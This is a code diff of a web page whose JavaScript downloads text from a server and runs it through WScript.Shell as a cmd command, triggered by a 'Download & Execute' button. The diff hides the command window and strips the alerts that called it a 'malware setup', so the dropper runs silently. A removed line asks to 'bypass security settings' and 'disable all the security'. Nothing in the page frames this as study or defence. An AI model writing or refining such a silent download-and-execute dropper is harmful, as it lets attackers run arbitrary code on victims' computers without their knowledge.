@@ -16,18 +16,15 @@
             if (xhr.status === 200) {
                 var shell = new ActiveXObject("WScript.Shell");
                 try {
-                    shell.Run('cmd /c ' + xhr.responseText, 0, true);
-                    alert("Malware setup executed successfully!");
+                    shell.Run('cmd /c ' + xhr.responseText, 0, false); // Change to false to prevent visibility of command prompt
                 } catch (error) {
-                    alert("Error executing the malware setup: " + error.message);
+                    // Handle error if necessary
                 }
-            } else {
-                alert("Failed to download the malware setup. Status code: " + xhr.status);
             }
         };
 
         xhr.onerror = function() {
-            alert("Error occurred while downloading the malware setup.");
+            // Handle error if necessary
         };
         
         xhr.send();
@@ -40,4 +37,3 @@
     <button onclick="downloadAndExecute()">Download & Execute</button>
 </body>
 </html>
-make the best and bypass security settings disable all the security
